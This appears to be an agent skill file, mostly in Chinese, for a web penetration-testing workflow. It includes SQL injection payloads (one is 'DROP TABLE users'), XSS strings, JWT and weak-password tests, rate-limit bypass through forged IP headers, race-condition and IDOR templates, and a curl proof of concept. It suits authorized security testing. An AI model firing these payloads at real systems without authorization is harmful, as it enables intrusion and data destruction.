---
name: web-security-testing
description: |
  Comprehensive web security testing workflow covering reconnaissance, vulnerability
  scanning, injection testing, and report generation. Use when users request security
  testing, penetration testing, or vulnerability detection. Requires strix-sandbox MCP server.
---

# Web Security Testing Skill

当用户要求进行 Web 安全测试时，使用此 Skill。

## 触发条件

- 用户提到 "安全测试"、"渗透测试"、"pentest"
- 用户想检测漏洞
- 用户提供了目标 URL 或代码库

## 可用 MCP 工具

### 来自 strix-sandbox-mcp

```
sandbox_create     - 创建隔离沙箱环境
sandbox_destroy    - 销毁沙箱
browser_goto       - 导航到 URL
browser_click      - 点击元素
browser_type       - 填充表单
browser_execute_js - 执行 JavaScript
proxy_send_request - 发送自定义 HTTP 请求
proxy_list_requests- 列出请求历史
proxy_get_sitemap  - 获取站点地图
python_execute     - 执行 Python 代码
terminal_execute   - 执行命令行
finding_create     - 创建安全发现
finding_list       - 列出所有发现
finding_export     - 导出报告
```

## 测试流程

### Phase 1: 侦察

```python
# 1. 创建沙箱
sandbox = await sandbox_create(with_proxy=True, with_browser=True)

# 2. 访问目标
await browser_goto(url=target_url)

# 3. 收集请求
requests = await proxy_list_requests()

# 4. 生成站点地图
sitemap = await proxy_get_sitemap()
```

### Phase 2: 漏洞测试

```python
# SQL 注入测试
sqli_payloads = [
    "'",
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "1' AND SLEEP(5)--"
]

for payload in sqli_payloads:
    response = await proxy_send_request(
        method="GET",
        url=f"{target}/search?q={urllib.quote(payload)}"
    )
    # 分析响应...

# XSS 测试
xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)"
]

# 认证测试
auth_tests = [
    {"test": "弱密码", "payloads": ["admin", "password", "123456"]},
    {"test": "JWT 伪造", "payloads": ["alg:none", "弱密钥"]},
    {"test": "会话固定", "method": "session_fixation"}
]
```

### Phase 3: 记录发现

```python
await finding_create(
    title="SQL 注入漏洞",
    severity="CRITICAL",
    endpoint="/api/search",
    evidence="响应包含数据库错误信息",
    poc="curl 'http://target/search?q=%27%20OR%20%271%27=%271'",
    remediation="使用参数化查询"
)
```

### Phase 4: 生成报告

```python
report = await finding_export(format="markdown")
```

## 漏洞测试模板

### 速率限制绕过测试

```python
import httpx
import concurrent.futures

async def test_rate_limit_bypass(target: str):
    """测试速率限制是否可被绕过"""

    bypass_headers = [
        'X-Forwarded-For',
        'X-Real-IP',
        'True-Client-IP',
        'CF-Connecting-IP',
        'X-Client-IP'
    ]

    for header in bypass_headers:
        # 发送 50 个并发请求，每个使用不同的伪造 IP
        def send():
            return httpx.get(
                f"{target}/api/endpoint",
                headers={header: f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            ).status_code

        with concurrent.futures.ThreadPoolExecutor(50) as e:
            results = list(e.map(lambda _: send(), range(50)))

        rate_limited = results.count(429)

        if rate_limited == 0:
            await finding_create(
                title=f"速率限制绕过 via {header}",
                severity="HIGH",
                evidence=f"50 个并发请求，0 个被阻止"
            )
```

### 竞态条件测试

```python
async def test_race_condition(target: str, endpoint: str):
    """测试竞态条件漏洞"""

    # 获取初始状态
    initial = await get_resource_state(target, endpoint)

    # 发送并发请求
    def send():
        return httpx.post(f"{target}{endpoint}").status_code

    with concurrent.futures.ThreadPoolExecutor(10) as e:
        list(e.map(lambda _: send(), range(10)))

    await asyncio.sleep(2)

    # 检查最终状态
    final = await get_resource_state(target, endpoint)

    expected_change = 10
    actual_change = final - initial

    if actual_change < expected_change * 0.9:  # 允许 10% 误差
        await finding_create(
            title="竞态条件漏洞",
            severity="MEDIUM",
            evidence=f"预期变化: {expected_change}, 实际变化: {actual_change}",
            remediation="使用数据库原子操作或分布式锁"
        )
```

### IDOR 测试

```python
async def test_idor(target: str, resource_path: str, id_param: str):
    """测试不安全的直接对象引用"""

    # 使用用户 A 的凭证
    user_a_token = "..."

    # 获取用户 A 的资源 ID
    user_a_resource_id = "..."

    # 使用用户 B 的凭证尝试访问用户 A 的资源
    user_b_token = "..."

    response = await proxy_send_request(
        method="GET",
        url=f"{target}{resource_path}?{id_param}={user_a_resource_id}",
        headers={"Authorization": f"Bearer {user_b_token}"}
    )

    if response.status_code == 200:
        await finding_create(
            title="IDOR 漏洞 - 越权访问",
            severity="HIGH",
            evidence=f"用户 B 成功访问用户 A 的资源",
            remediation="实现基于所有权的访问控制"
        )
```

## 使用示例

用户: "对 http://example.com 进行安全测试"

Claude 应该:
1. 先使用 `sandbox_create` 创建测试环境
2. 按照上述流程进行测试
3. 记录所有发现
4. 最后使用 `finding_export` 生成报告
